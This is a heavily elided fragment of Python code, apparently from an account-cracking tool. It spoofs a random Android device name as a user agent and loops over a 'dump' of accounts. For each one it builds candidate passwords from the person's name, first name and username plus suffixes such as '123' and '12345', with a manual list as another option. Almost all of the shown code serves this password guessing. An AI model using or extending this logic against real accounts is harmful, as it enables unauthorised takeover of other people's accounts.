...
def ua_rozha():
    ...
    me = str(rc(["vivo 1907", "V2050","vivo Y55A"]))
            ...
            for akun in dump:
                ...
                if apa in ['1', '01']:
                    ...
                    if len(dp) < 3 or len(nama) < 5:
                        ...
                        pwx = [nama, dp2 + "123", fn + '123', fn + '1234', fn + '12345', dp + '123', dp + '1234', dp + '12345', dp + '123456', user, user + '123', user + '1234', user + '12345']
                    else:
                         pwx = [nama, fn + '123', fn + '1234', fn + '12345', dp + '123', dp + '1234', dp + '12345', dp + '123456', user2, user2 + '123', user2 + '1234', user2 + '12345']   
                elif apa in ['4', '04']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = manual
                    else:
